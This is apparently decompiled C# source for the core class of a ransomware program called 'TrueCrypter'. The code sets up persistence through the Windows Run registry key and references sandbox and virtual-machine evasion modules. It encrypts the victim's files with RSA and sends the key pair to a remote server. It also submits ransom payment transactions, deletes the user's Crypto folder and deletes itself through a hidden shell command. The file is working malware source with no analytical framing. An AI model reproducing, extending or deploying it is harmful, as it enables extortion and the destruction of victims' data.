using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;
using TrueCrypter.Antis;
using TrueCrypter.Config;
using TrueCrypter.Ransomware.Core.Cryptography;
using TrueCrypter.Ransomware.Core.Networking;
using TrueCrypter.Ransomware.Core.Wrappers;

namespace TrueCrypter.Ransomware.Core;

public class TrueCrypter
{
	public static RSA encrypter = new RSA();

	public static HashSet<string> EncryptedFiles = new HashSet<string>();

	public static ProcessKiller ProcessKiller = new ProcessKiller();

	public static SandBoxie SandBoxie = new SandBoxie();

	public static VMWare VMWare = new VMWare();

	public static VirtualBox VirtualBox = new VirtualBox();

	public static bool Unlocked = false;

	public static void Install()
	{
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			File.Copy(Application.get_ExecutablePath(), Settings.TrueCrypterPath + "TrueCrypter.exe");
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("TrueCrypter", Settings.TrueCrypterPath + "TrueCrypter.exe");
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}

	public static void Uninstall()
	{
		string[] array = new string[4]
		{
			Settings.TrueCrypterPath + "TrueCrypter.xml",
			Settings.TrueCrypterPath + "TrueCrypter.exe",
			Settings.TrueCrypterPath + "Encrypted.dat",
			Settings.TrueCrypterPath + "background.jpg"
		};
		string[] array2 = array;
		foreach (string path in array2)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		Directory.Delete(Settings.TrueCrypterPath);
		Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("TrueCrypter");
		Windows.SetDesktopWallpaper(Settings.Wallpaper);
		try
		{
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Application.get_ExecutablePath(),
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			};
			Process.Start(startInfo);
			Unlocked = true;
			Environment.Exit(1);
		}
		catch
		{
		}
	}

	public static string GetPrivateKey(string PublicKey)
	{
		return NetworkClient.GetHtml(Settings.ServerUrl + "/Status.php?public_key=" + PublicKey).Replace(" ", "+");
	}

	private static void SendKeysToServer(string PublicKey, string PrivateKey)
	{
		NetworkClient.GetHtml(Settings.ServerUrl + "/Submit.php?public_key=" + PublicKey + "&private_key=" + PrivateKey);
	}

	public static void EncryptFiles()
	{
		FilesWrapper filesWrapper = new FilesWrapper();
		filesWrapper.Search();
		SendKeysToServer(encrypter.PublicKey, encrypter.PrivateKey);
		foreach (string file in filesWrapper.Files)
		{
			if (encrypter.Encrypt(file))
			{
				EncryptedFiles.Add(file + ".enc");
			}
		}
		string[] array = new string[EncryptedFiles.Count];
		EncryptedFiles.CopyTo(array);
		File.WriteAllLines(Settings.TrueCrypterPath + "Encrypted.dat", array);
		ClearRSA();
	}

	public static void DecryptFiles(string PrivateKey)
	{
		encrypter.PrivateKey = PrivateKey;
		encrypter.PublicKey = Settings.PublicKey;
		foreach (string encryptedFile in EncryptedFiles)
		{
			encrypter.Decrypt(encryptedFile);
		}
		ClearRSA();
	}

	public static void ClearRSA()
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Crypto");
			directoryInfo.Delete(recursive: true);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}

	public static void SubmitTransaction(string ID, string PaymentMethod, string PublicKey)
	{
		NetworkClient.GetHtml(Settings.ServerUrl + "/Transaction.php?public_key=" + PublicKey + "&transaction_id=" + ID + "&payment_method=" + PaymentMethod);
	}
}
